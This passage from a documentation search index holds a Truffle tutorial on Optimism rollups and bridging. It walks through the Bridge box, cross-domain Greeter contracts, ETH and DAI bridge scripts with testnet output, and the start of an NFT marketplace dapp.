"Web3 Unleashed: Optimistic rollups and bridging with Optimism"}, {"location": "guides/optimism-bridge-widget/#overview", "text": "In this episode of Web3 Unleashed, we're chatting with Annie Ke from Optimism about all things L2: optimistic roll-ups, bridging, and Optimism Bedrock! At the end, we'll build a bridge widget that leverages the scripts in the Truffle Optimism Bridge box , to embed bridging into your Optimism dapps! If you want a deeper dive into the bridge contract interfaces and an overview of L1s, L2s, and bridging, catch our presentation at Devcon! The completed code lives here .", "title": "Overview"}, {"location": "guides/optimism-bridge-widget/#bridging-basics-in-the-optimism-bridge-box", "text": "In this tutorial, we'll be creating an NFT Marketplace on Optimism and then adding Bridget, an Optimism bridge widget, that will bridge ETH using Optimism's bridge SDK. NOTE: To do the bridging for our widget, we will be interacting with the Optimism bridge contract that has already been deployed. Therefore, we will only be interacting with Ethereum Goerli and Optimism Goerli. If we wanted to run all of this locally, there are a lot of additional steps, such as deploying all the Optimism contracts to your local Ethereum and local Optimism and running a local sequencer.", "title": "Bridging basics in the Optimism Bridge Box"}, {"location": "guides/optimism-bridge-widget/#set-up", "text": "", "title": "Set Up"}, {"location": "guides/optimism-bridge-widget/#install-truffle", "text": "You'll need to install the latest version of Truffle", "title": "Install Truffle"}, {"location": "guides/optimism-bridge-widget/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/optimism-bridge-widget/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, deploy, and debug your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/optimism-bridge-widget/#create-an-infura-account-and-infura-project", "text": "To connect your DApp to Ethereum Goerli and Optimism Goerli, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it optimism-marketplace , and select Web3 API from the dropdown.", "title": "Create an Infura account and Infura project"}, {"location": "guides/optimism-bridge-widget/#get-ethereum-goerli-eth-optimism-goerli-eth-and-goerli-dai", "text": "In order to deploy your contracts and run our bridging scripts, you'll need some test Eth to cover your gas fees! There are multiple ways to get each one: Ethereum Goerli Eth: Paradigm has a great MultiFaucet that deposits funds across different networks. Optimism Goerli Eth: Optimism provides its own faucet for Optimism Goerli. Goerli DAI: Go to Uniswap , and connect your wallet to the Goerli test network. Then, exchange some of your Goerli ETH for Goerli DAI.", "title": "Get Ethereum Goerli Eth, Optimism Goerli Eth, and Goerli DAI"}, {"location": "guides/optimism-bridge-widget/#unbox-the-optimism-bridge-box", "text": "The Truffle Optimism Bridge Box contains contracts that interact with the Optimism bridge on L1 and L2, along with a set of migrations for deploying, calling functions, and passing messages and value between both layers. To set it up: truffle unbox optimism-bridge optimism-bridge cd optimism-bridge unbox will automatically run npm install for you.", "title": "Unbox the Optimism Bridge Box"}, {"location": "guides/optimism-bridge-widget/#bridge-box-contents", "text": "There's a lot in this box! Let's go over some key differences between this box and a vanilla truffle init : package.json The box contains some special scripts to perform common functions. For example, migrate:ovm will migrate using truffle-confg.ovm.js without you having to type out --config truffle-config.ovm.js . contracts/ethereum and contracts/optimism The contracts folder is further divided into ethereum and optimism to differentiate between the two contracts. contracts/Greeter.sol We use the pre-deployed instance of this contract. It's the example contract from this Optimism tutorial for reference/learning. contracts/ethereum/GreeterL1.sol This contract will be deployed on Ethereum and controls a Greeter on Optimism. contracts/optimism/GreeterL2.sol This contract will be deployed on Optimism and controls a Greeter on Ethereum. truffle-config.js and truffle-config.ovm.js In order to specify which chain to deploy to, we introduce a second config - truffle-config.ovm.js - with its own build path, contract directory, and networks. By default, truffle migrate will use truffle-config.js . When we want to deploy our Optimism contracts, however, we can specify --config truffle-config.ovm.js so that we properly deploy the correct contracts to the relevant networks. migrations In this box, we have four different migrations files. 1_deploy_L1_contracts.js deploys the Ethereum contract GreeterL1.sol . 2_deploy_L2_contracts.js deploys the Optimism contract GreeterL2.sol . The remaining 2 migrations, 3_set_L2_greeting.js and 4_set_L1_greeting.js actually don't deploy contracts - they call contract functions to send messages across L1 and L2. Normally, 3_set_L2_greeting.js and 4_set_L1_greeting.js would just go in a separate Truffle script since it's just sending messages rather than deploying a contract. However, in this case, we wanted to illustrate how with Truffle, you can write ordered, incremental steps with migrations to end in a desired state. You can see how this is done in scripts/goerli_bridge_message.mjs . scripts/goerli_bridge_message.mjs npm run deploy runs this script - which is actually a series of truffle migrate calls. This automates the process of compiling contracts, running migrations, and sending messages across each side of the bridge. Note the --f 1 --to 1 , --f 2 --to 2 , --f 3 --to 3 , and --f 4 --to 4 flags. This is how we tell Truffle which migrations to run provided we prefix the migration script's name with the appropriate number. scripts/goerli_bridge_value.mjs This script automates the process of compiling contracts, running migrations, and sending messages across each side of the bridge. Let's dive into some of these files in depth.", "title": "Bridge Box Contents"}, {"location": "guides/optimism-bridge-widget/#contractsgreetersol", "text": "There are two important functions to call out here: function setGreeting ( string memory _greeting ) public { greeting = _greeting ; emit SetGreeting ( msg . sender , tx . origin , getXorig ()); } setGreeting is the function we will be calling in the other contract. It doesn't do anything other than set a greeting message. // Get the cross domain origin, if any function getXorig () private view returns ( address ) { // Get the cross domain messenger's address each time. // This is less resource intensive than writing to storage. address cdmAddr = address ( 0 ); // Mainnet if ( block . chainid == 1 ) cdmAddr = 0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1 ; // Kovan if ( block . chainid == 42 ) cdmAddr = 0x4361d0F75A0186C05f971c566dC6bEa5957483fD ; // Goerli if ( block . chainid == 5 ) cdmAddr = 0x5086d1eEF304eb5284A0f6720f79403b4e9bE294 ; // L2 (same address on every network) if ( block . chainid == 10 || block . chainid == 69 || block . chainid == 420 ) cdmAddr = 0x4200000000000000000000000000000000000007 ; // If this isn't a cross domain message if ( msg . sender != cdmAddr ) return address ( 0 ); // If it is a cross domain message, find out where it is from return ICrossDomainMessenger ( cdmAddr ). xDomainMessageSender (); } // getXorig() getXorig returns the address of the original contract calling the messenger.", "title": "contracts/Greeter.sol"}, {"location": "guides/optimism-bridge-widget/#contractsgreeterl1sol", "text": "This contract is deployed on Ethereum, but will be calling the setGreeting method from the pre-deployed Greeter contract on Optimism Goerli. address crossDomainMessengerAddr = 0x5086d1eEF304eb5284A0f6720f79403b4e9bE294 ; As you can see, this is the messenger contract address for the Goerli Chain Id 5 as specified in Greeter.sol . address greeterL2Addr = 0xC0836cCc8FBa87637e782Dde6e6572aD624fb984 ; This is the address of the pre-deployed Greeter contract on Optimism Goerli. function setGreeting ( string calldata _greeting ) public { bytes memory message ; message = abi . encodeWithSignature ( \"setGreeting(string)\" , _greeting ); ICrossDomainMessenger ( crossDomainMessengerAddr ). sendMessage ( greeterL2Addr , message , 1000000 // within the free gas limit amount ); } Finally, setGreeting does 2 things: - Sets message to be the encoded function signature and input - Calls the sendMessage method to call that function on the L2 contract", "title": "contracts/GreeterL1.sol"}, {"location": "guides/optimism-bridge-widget/#contractsgreeterl2sol", "text": "This contract does the same thing as GreeterL1.sol , except that it uses the messenger contract on Optimism ( 0x4200000000000000000000000000000000000007 ) and calls the function from Greeter contract on Ethereum.", "title": "contracts/GreeterL2.sol"}, {"location": "guides/optimism-bridge-widget/#scriptsgoerli_bridge_valuemjs", "text": "This script demonstrates how to deposit/withdraw Ethereum and DAI using Optimism's SDK, which relies on Optimism's Standard Bridge. It's a big script, so we'll go over the most important parts. // Contract addresses for DAI tokens, taken // from https://static.optimism.io/optimism.tokenlist.json const daiAddrs = { l1Addr : \"0x11fE4B6AE13d2a6055C8D9cF65c55bac32B5d844\" , l2Addr : \"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1\" , }; // daiAddrs The standard bridge can only be used with tokens that have a properly configured ERC20 version on Optimism. In this case, we can find the tokens on this list . /** * getSigners() * Initializes ethers providers and returns wallets. */ const getSigners = async () => { const l1RpcProvider = new ethers . providers . JsonRpcProvider ( l1Url ); const l2RpcProvider = new ethers . providers . JsonRpcProvider ( l2Url ); const hdNode = ethers . utils . HDNode . fromMnemonic ( goerliMnemonic ); const privateKey = hdNode . derivePath ( ethers . utils . defaultPath ). privateKey ; const l1Wallet = new ethers . Wallet ( privateKey , l1RpcProvider ); const l2Wallet = new ethers . Wallet ( privateKey , l2RpcProvider ); return [ l1Wallet , l2Wallet ]; }; // getSigners /** * setup() * Initializes Optimism SDK's Cross Chain Messenger */ const setup = async () => { const [ l1Signer , l2Signer ] = await getSigners (); addr = l1Signer . address ; crossChainMessenger = new optimismSDK . CrossChainMessenger ({ l1ChainId : 5 , // Goerli value, 1 for mainnet l2ChainId : 420 , // Goerli value, 10 for mainnet l1SignerOrProvider : l1Signer , l2SignerOrProvider : l2Signer }) l1ERC20 = new ethers . Contract ( daiAddrs . l1Addr , erc20ABI , l1Signer ); l2ERC20 = new ethers . Contract ( daiAddrs . l2Addr , erc20ABI , l2Signer ); }; // setup These two methods are relatively straightforward. They are just setting up our wallets to sign our transactions. Notice in this case, we are specifying Goerli and Optimism Goerli, which have the chainIds 5 and 420, respectively. /** * reportBalances() * Logs ETH balances on L1 and L2. */ const reportBalances = async () => { const l1Balance = ( await crossChainMessenger . l1Signer . getBalance ()) . toString () . slice ( 0 , - 9 ); const l2Balance = ( await crossChainMessenger . l2Signer . getBalance ()) . toString () . slice ( 0 , - 9 ); console . log ( `On L1: ${ l1Balance } Gwei On L2: ${ l2Balance } Gwei` ); }; // reportBalances /** * reportERC20Balances() * Logs DAI balances on L1 and L2. */ const reportERC20Balances = async () => { const l1Balance = ( await l1ERC20 . balanceOf ( addr )). toString (). slice ( 0 , - 18 ); const l2Balance = ( await l2ERC20 . balanceOf ( addr )). toString (). slice ( 0 , - 18 ); console . log ( `DAI on L1: ${ l1Balance } DAI on L2: ${ l2Balance } ` ); }; // reportERC20Balances These are simply methods that will log how much DAI/ETH we have on each layer. They are used to give visibility into our assets while we are depositing/withdrawing tokens. /** * depositETH() * Bridges ETH from L1 to L2 and reports balances */ const depositETH = async () => { console . log ( \"Deposit ETH\" ); await reportBalances (); const start = new Date (); const response = await crossChainMessenger . depositETH ( gwei ); console . log ( `Transaction hash (on L1): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . RELAYED ); await reportBalances (); console . log ( `depositETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n` ); }; // depositETH() In order to bridge Eth from L1 to L2, we call crossChainMessenger.depositETH , which takes gwei. To know that the bridging has completed, we need to wait for the RELAYED status. You can see the list of all possible statuses here . /** * depositERC20() * Bridges DAI from L1 to L2 and reports balances */ const depositERC20 = async () => { console . log ( \"Deposit ERC20\" ); await reportERC20Balances (); const start = new Date (); // Need the l2 address to know which bridge is responsible const allowanceResponse = await crossChainMessenger . approveERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); await allowanceResponse . wait (); console . log ( `Allowance given by tx ${ allowanceResponse . hash } ` ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); const response = await crossChainMessenger . depositERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); console . log ( `Deposit transaction hash (on L1): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . RELAYED ); await reportERC20Balances (); console . log ( `depositERC20 took ${ ( new Date () - start ) / 1000 } seconds\\n\\n` ); }; // depositERC20() This method is relatively the same as depositETH . However, there is one important thing to call out. When we are bridging an ERC20 token, we MUST approve the Standard Token Bridge to use the amount of tokens that you want to deposit and the token contract addresses you care about or the deposit will fail. We do this in this part of the code: // Need the l2 address to know which bridge is responsible const allowanceResponse = await crossChainMessenger . approveERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); /** * withdrawETH() * Bridges ETH from L2 to L1 and reports balances */ const withdrawETH = async () => { console . log ( \"Withdraw ETH\" ); const start = new Date (); await reportBalances (); const response = await crossChainMessenger . withdrawETH ( centieth ); console . log ( `Transaction hash (on L2): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to IN_CHALLENGE_PERIOD\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . IN_CHALLENGE_PERIOD ); console . log ( \"In the challenge period, waiting for status READY_FOR_RELAY\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . READY_FOR_RELAY ); console . log ( \"Ready for relay, finalizing message now\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . finalizeMessage ( response ); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response , optimismSDK . MessageStatus . RELAYED ); await reportBalances (); console . log ( `withdrawETH took ${ ( new Date () - start ) / 1000 } seconds\\n\\n\\n` ); }; // withdrawETH() This method withdraws ETH from L2 to L1. Specifically, you'll notice now we check for two new states: IN_CHALLENGE_PERIOD and READY_FOR_RELAY . This is because when bridging from L2 to L1, there needs to be a time delay during which the transaction can be challenged (i.e., the challenge period). /** * withdrawERC20() * Bridges DAI from L2 to L1 and reports balances */ const withdrawERC20 = async () => { console . log ( \"Withdraw ERC20\" ); const start = new Date (); await reportERC20Balances (); const response = await crossChainMessenger . withdrawERC20 ( daiAddrs . l1Addr , daiAddrs . l2Addr , dai ); console . log ( `Transaction hash (on L2): ${ response . hash } ` ); await response . wait (); console . log ( \"Waiting for status to change to IN_CHALLENGE_PERIOD\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . IN_CHALLENGE_PERIOD ); console . log ( \"In the challenge period, waiting for status READY_FOR_RELAY\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response . hash , optimismSDK . MessageStatus . READY_FOR_RELAY ); console . log ( \"Ready for relay, finalizing message now\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . finalizeMessage ( response ); console . log ( \"Waiting for status to change to RELAYED\" ); console . log ( `Time so far ${ ( new Date () - start ) / 1000 } seconds` ); await crossChainMessenger . waitForMessageStatus ( response , optimismSDK . MessageStatus . RELAYED ); await reportERC20Balances (); console . log ( `withdrawERC20 took ${ ( new Date () - start ) / 1000 } seconds\\n\\n\\n` ); }; // withdrawERC20() This is just the ERC20 counterpart to the withdrawETH version. Now, let's actually run the scripts to see the output of Optimism bridging!", "title": "scripts/goerli_bridge_value.mjs"}, {"location": "guides/optimism-bridge-widget/#deploy-the-contracts-and-send-messages", "text": "In order to run our deployment script that also sends messages, we'll need to specify our mnemonics and Infura API key for the optimism-marketplace project we created earlier for the different networks we will be deploying to. Specify your GOERLI_MNEMONIC and INFURA_KEY in a .env file. After that's been specified, you should be able to run npm run deploy . You'll see that two contracts have been deployed and will be prompted to view the bridged on Etherscan. The result looks like this: Output $ truffle compile --config = truffle-config.ovm Compiling your contracts... =========================== > Compiling ./contracts/optimism/GreeterL2.sol > Compiling @eth-optimism/contracts/libraries/bridge/ICrossDomainMessenger.sol > Artifacts written to /Users/emilylin/dev/optimism-bridge-box/build/optimism-contracts > Compiled successfully using: - solc: 0 .8.4+commit.c7e474f2.Emscripten.clang $ truffle migrate --network = goerli --f 1 --to 1 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'goerli' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 1_deploy_L1_contracts.js ======================== Deploying L1 Greeter \ud83d\udc4b Deploying 'GreeterL1' --------------------- > transaction hash: 0x0d60c97232474974d872fb99159772681351275a45fc33034818e4a069ba3944 - Blocks: 0 Seconds: 0 - Blocks: 1 Seconds: 4 - Blocks: 1 Seconds: 8 - Blocks: 1 Seconds: 12 - Blocks: 2 Seconds: 16 - Blocks: 2 Seconds: 20 - Blocks: 2 Seconds: 24 - Blocks: 2 Seconds: 28 - Blocks: 2 Seconds: 32 - Blocks: 2 Seconds: 36 > Blocks: 2 Seconds: 36 > contract address: 0x70B01484283d5495930125305ebbB62224EF9424 > block number: 7711471 > block timestamp: 1664905308 > account: 0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8 > balance: 0 .258526123140245736 > gas used: 326161 ( 0x4fa11 ) > gas price: 2 .50000001 gwei > value sent: 0 ETH > total cost: 0 .00081540250326161 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .00081540250326161 ETH Summary ======= > Total deployments: 1 > Final cost: 0 .00081540250326161 ETH $ truffle migrate --network = optimistic_goerli --config = truffle-config.ovm --f 2 --to 2 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'optimistic_goerli' > Network id: 420 > Block gas limit: 15000000 ( 0xe4e1c0 ) 2_deploy_L2_contracts.js ======================== Deploying L2 Greeter \ud83d\udc4b\ud83d\udc4b Deploying 'GreeterL2' --------------------- > transaction hash: 0x019c43d23d1998655e0d3511372847d4c5390c6c2708be1fdea1edab5c5d240d - Blocks: 0 Seconds: 0 - Blocks: 3 Seconds: 4 > Blocks: 3 Seconds: 4 > contract address: 0xdB48896120B728a3a152a07cF40632820ADa7111 > block number: 1683657 > block timestamp: 1664905316 > account: 0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8 > balance: 0 .399999347575380974 > gas used: 232016 ( 0x38a50 ) > gas price: 0 .000000001 gwei > value sent: 0 ETH > total cost: 0 .000000000000232016 ETH > Saving artifacts ------------------------------------- > Total cost: 0 .000000000000232016 ETH Summary ======= > Total deployments: 1 > Final cost: 0 .000000000000232016 ETH $ truffle migrate --network = goerli --f 3 --to 3 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'goerli' > Network id: 5 > Block gas limit: 30000000 ( 0x1c9c380 ) 3_set_L2_greeting.js ==================== Updating the L2 Greetings contract from L1! \ud83d\udc4b\ud83d\udc4b \ud83d\ude4c Greeter txn confirmed on L1! 0xe392e0edb1dbc5db05546846eb0c098e20bfc1557265e8ee5c2ced3f8be76bc0 \ud83d\udee3\ufe0f Bridging message to L2 Greeter contract... \ud83d\udd50 In about 1 minute, check the Greeter contract \"read\" function : https://goerli-optimism.etherscan.io/address/0xC0836cCc8FBa87637e782Dde6e6572aD624fb984#readContract ------------------------------------- > Total cost: 0 ETH Summary ======= > Total deployments: 0 > Final cost: 0 ETH $ truffle migrate --network = optimistic_goerli --config = truffle-config.ovm --f 4 --to 4 --skip-dry-run Compiling your contracts... =========================== > Everything is up to date, there is nothing to compile. Starting migrations... ====================== > Network name: 'optimistic_goerli' > Network id: 420 > Block gas limit: 15000000 ( 0xe4e1c0 ) 4_set_L1_greeting.js ==================== Updating the L1 Greetings contract from L2! \ud83d\udc4b \ud83d\ude4c\ud83d\ude4c Greeter txn confirmed on L2! 0x4ed90d90a5b30770c69766b4bc017c78bc15322169baada2a95e1e01ca048eaa \ud83d\udee3\ufe0f Bridging message to L1 Greeter contract. \ud83d\udd50 This will take at least 1 -5 min... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... Message not yet received on L1. \ud83d\udd50 Retrying in 10 seconds... \ud83d\udcec Message received! Finalizing... \ud83c\udf89 Message finalized. Check the L1 Greeter contract \"read\" function : https://goerli.etherscan.io/address/0x7fA4D972bB15B71358da2D937E4A830A9084cf2e#readContract ------------------------------------- > Total cost: 0 ETH Summary ======= > Total deployments: 0 > Final cost: 0 ETH", "title": "Deploy the contracts and send messages"}, {"location": "guides/optimism-bridge-widget/#send-eth-and-dai-across-the-bridge", "text": "To send Eth and DAI across the bridge, simply run a truffle exec scripts/goerli_bridge_value.js . This result should look like this: Output Deposit ETH On L1:207145727 Gwei On L2:539999353 Gwei Transaction hash ( on L1 ) : 0x5af02f2c7b9350fa3762f37aedc9df6cbf826e82e00ad19ba4c11abfc46ec783 Waiting for status to change to RELAYED Time so far 22 .473 seconds On L1:206934536 Gwei On L2:539999355 Gwei depositETH took 220 .514 seconds Withdraw ETH On L1:206934536 Gwei On L2:539999355 Gwei Transaction hash ( on L2 ) : 0x7315691a120bd13954b2d3243e8fe47f68c14a920ecaf5b889a06a8af46b4f18 Waiting for status to change to IN_CHALLENGE_PERIOD Time so far 3 .284 seconds In the challenge period, waiting for status READY_FOR_RELAY Time so far 151 .495 seconds Ready for relay, finalizing message now Time so far 162 .431 seconds Waiting for status to change to RELAYED Time so far 166 .164 seconds On L1:215727635 Gwei On L2:529999355 Gwei withdrawETH took 188 .858 seconds Deposit ERC20 DAI on L1:43 DAI on L2: Allowance given by tx 0xf81b69b54597af3934daad2a0b0491fb19d161714f84b535b702137e08a7f2d3 Time so far 22 .799 seconds Deposit transaction hash ( on L1 ) : 0xe29e229f7afece8c09317db908ff3166c41f6858972e7ac44c3069fde458319b Waiting for status to change to RELAYED Time so far 34 .414 seconds DAI on L1:42 DAI on L2:1 depositERC20 took 261 .9 seconds Withdraw ERC20 DAI on L1:42 DAI on L2:1 Transaction hash ( on L2 ) : 0x569c638dfb4a034b6a267b024c415dbc5f26412fb6f2c7a56b531d332f209ae9 Waiting for status to change to IN_CHALLENGE_PERIOD Time so far 8 .008 seconds In the challenge period, waiting for status READY_FOR_RELAY Time so far 324 .519 seconds Ready for relay, finalizing message now Time so far 359 .411 seconds Waiting for status to change to RELAYED Time so far 363 .363 seconds DAI on L1:43 DAI on L2: withdrawERC20 took 372 .773 seconds Given everything works, we can essentially copy paste the relevant withdrawETH/depositETH functions in goerli_bridge_value.js into a frontend Bridge component. We'll be doing that when we create the NFT marketplace.", "title": "Send Eth and DAI across the bridge"}, {"location": "guides/optimism-bridge-widget/#build-a-marketplace-dapp-on-optimism", "text": "Now that we've got the bridging basics down, let's use the NFT marketplace tutorial in this guide and add a new page specifically for users to bridge their ETH. We will be organizing the project folder structure into two parts: a truffle folder for all of your smart contract development needs, and a client folder to hold your code for the marketplace frontend.", "title": "Build a Marketplace DApp on Optimism"}, {"location": "guides/optimism-bridge-widget/#move-bridge-contents-into-a-truffle-folder", "text": "Now that we are adding a client component to our DApp, let's place all the relevant Truffle files in a separate folder for organization. Create a folder called truffle . Then, move the contracts , migrations , scripts , and node_modules folders into the truffle folder. Then, also move .env , package.json , package-lock.json , truffle-config.js , and truffle-config.ovm.js into the truffle folder . We don't need the .env.example anymore, so delete that too. Your top level directory folder structure should look like this: . \u251c\u2500\u2500 .gitignore \u251c\u2500\u2500 LICENSE \u251c\u2500\u2500 README.md \u251c\u2500\u2500 client \u2514\u2500\u2500 truffle Your truffle folder structure should look like this: truffle \u251c\u2500\u2500 .env \u251c\u2500\u2500 contracts \u251c\u2500\u2500 migrations \u251c\u2500\u2500 node_modules \u251c\u2500\u2500 package-lock.json \u251c\u2500\u2500 package.json \u251c\u2500\u2500 scripts \u251c\u2500\u2500 test \u251c\u2500\u2500 truffle-config.js \u2514\u2500\u2500 truffle-config.ovm.js We also don't need the Greeter contracts, so let's go ahead and delete the related files: GreeterL1.sol , GreeterL2.sol , Greeter.sol , all the migrations files, and goerli_bridge_message.mjs .", "title": "Move bridge contents into a truffle folder"}, {"location": "guides/optimism-bridge-widget/#create-client-folder-using-nextjs", "text": "To set up the frontend, we'll be using Next.js and Tailwind for our CSS. To do so, call: npx create-next-app@latest client Then, to add Tailwind to your project: cd client npm install -D tailwindcss@latest postcss@latest autoprefixer@latest npx tailwindcss init -p Edit tailwind.config.js module . exports = { content : [ \"./pages/**/*.{js,ts,jsx,tsx}\" , \"./components/**/*.{js,ts,jsx,tsx}\" , ], theme : { extend : {}, }, plugins : [], } And replace the code from styles/global.css @ tailwind base ; @ tailwind components ; @ tailwind utilities ; Nice! Now that we have our folder structure organized, let's first create our marketplace contracts.", "title": "Create client folder using Next.js"}, {"location": "guides/optimism-bridge-widget/#create-an-nft-and-marketplace-smart-contract", "text": "In this tutorial, we'll be using the same contracts and frontend as the Optimism NFT Marketplace , so if you want any in depth explanation of the smart contract code, please reference the NFT smart contract section and the marketplace smart contract section . To start, we will create two new Optimism contracts in the contracts/optimism folder. We also need @openzeppelin/contracts to inherit. To this, we can simply call: cd ../truffle npm i @openzeppelin/contracts truffle create contract OptimismNFT --config truffle-config.ovm.js truffle create contract OptimismMarketplace --config truffle-config.ovm.js Then, populate the contracts with the corresponding code from the previous tutorial: Code // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol\" ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; contract OptimismNFT is ERC721URIStorage { using Counters for Counters . Counter ; Counters . Counter private _tokenIds ; address marketplaceContract ; event NFTMinted ( uint256 ); constructor ( address _marketplaceContract ) ERC721 ( \"Optimism NFT\" , \"ON\" ) { marketplaceContract = _marketplaceContract ; } function mint ( string memory _tokenURI ) public { _tokenIds . increment (); uint256 newTokenId = _tokenIds . current (); _safeMint ( msg . sender , newTokenId ); _setTokenURI ( newTokenId , _tokenURI ); setApprovalForAll ( marketplaceContract , true ); emit NFTMinted ( newTokenId ); } } Code // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/utils/Counters.sol\" ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; contract OptimismMarketplace is ReentrancyGuard { using Counters for Counters . Counter ; Counters . Counter private _nftsSold ; Counters . Counter private _nftCount ; uint256 public LISTING_FEE = 0.0001 ether ; address payable private _marketOwner ; mapping ( uint256 => NFT ) private _idToNFT ; struct NFT { address nftContract ; uint256 tokenId ; address payable seller ; address payable owner ; uint256 price ; bool listed ; } event NFTListed ( address nftContract , uint256 tokenId , address seller , address owner , uint256 price ); event NFTSold ( address nftContract , uint256 tokenId , address seller , address owner , uint256 price ); constructor () { _marketOwner = payable ( msg . sender ); } // List the NFT on the marketplace function listNft ( address _nftContract , uint256 _tokenId , uint256 _price ) public payable nonReentrant { require ( _price > 0 , \"Price must be at least 1 wei\" ); require ( msg . value == LISTING_FEE , \"Not enough ether for listing fee\" ); IERC721 ( _nftContract ). transferFrom ( msg . sender , address ( this ), _tokenId ); _nftCount . increment (); _idToNFT [ _tokenId ] = NFT ( _nftContract , _tokenId , payable ( msg . sender ), payable ( address ( this )), _price , true ); emit NFTListed ( _nftContract , _tokenId , msg . sender , address ( this ), _price ); } // Buy an NFT function buyNft ( address _nftContract , uint256 _tokenId ) public payable nonReentrant { NFT storage nft = _idToNFT [ _tokenId ]; require ( msg . value >= nft . price , \"Not enough ether to cover asking price\" ); address payable buyer = payable ( msg . sender ); payable ( nft . seller ). transfer ( msg . value ); IERC721 ( _nftContract ). transferFrom ( address ( this ), buyer , nft . tokenId ); _marketOwner . transfer ( LISTING_FEE ); nft . owner = buyer ; nft . listed = false ; _nftsSold . increment (); emit NFTSold ( _nftContract , nft . tokenId , nft . seller , buyer , msg . value ); } // Resell an NFT purchased from the marketplace function resellNft ( address _nftContract , uint256 _tokenId , uint256 _price ) public payable nonReentrant { require ( _price > 0 , \"Price must be at least 1 wei\" ); require ( msg . value == LISTING_FEE , \"Not enough ether for listing fee\" ); IERC721 ( _nftContract ). transferFrom ( msg . sender , address ( this ), _tokenId ); NFT storage nft = _idToNFT [ _tokenId ]; nft . seller = payable ( msg . sender ); nft . owner = payable ( address ( this )); nft . listed = true ; nft . price = _price ; _nftsSold . decrement (); emit NFTListed ( _nftContract , _tokenId , msg . sender , address ( this ), _price ); } function getListingFee () public view returns ( uint256 